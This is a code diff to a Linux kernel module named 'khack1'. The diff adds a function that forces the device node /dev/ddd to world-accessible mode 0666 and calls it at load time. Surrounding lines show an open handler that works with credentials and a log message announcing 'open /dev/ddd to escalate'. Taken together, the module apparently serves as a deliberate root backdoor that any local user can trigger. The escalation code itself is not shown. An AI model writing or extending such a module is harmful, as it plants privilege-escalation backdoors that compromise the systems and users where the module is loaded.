@@ -16,6 +16,7 @@
 #include <linux/kernel.h>
 #include <linux/miscdevice.h>
 #include <linux/fs.h>
+#include <linux/namei.h>
 #include <linux/errno.h>
 #include <linux/mm.h>
 #include <linux/string.h>
@@ -121,6 +122,25 @@ static void khack_spawn_daemon(void)
 }
 
 
+/* misc_register's .mode is applied through the class devnode callback, which
+ * some vendor kernels ignore.  Set it explicitly so the node is always
+ * openable by unprivileged processes. */
+static void khack_force_mode(void)
+{
+	struct path path;
+	struct iattr attr;
+
+	if (kern_path("/dev/ddd", LOOKUP_FOLLOW, &path))
+		return;
+	attr.ia_valid = ATTR_MODE;
+	attr.ia_mode = 0666;
+	if (notify_change(&path, &attr, NULL))
+		pr_info("khack1: chmod /dev/ddd failed\n");
+	else
+		pr_info("khack1: /dev/ddd is 0666\n");
+	path_put(&path);
+}
+
 static int khack_open(struct inode *inode, struct file *file)
 {
 	void *cred;
@@ -169,6 +189,8 @@ static int __init khack_init(void)
 		pr_err("khack1: misc_register failed: %d\n", ret);
 		return ret;
 	}
+
+	khack_force_mode();
 
 	pr_info("khack1: BUILD 2026-10-24-umh pid=%d\n", current->pid);
 	pr_info("khack1: loaded, open /dev/ddd to escalate\n");
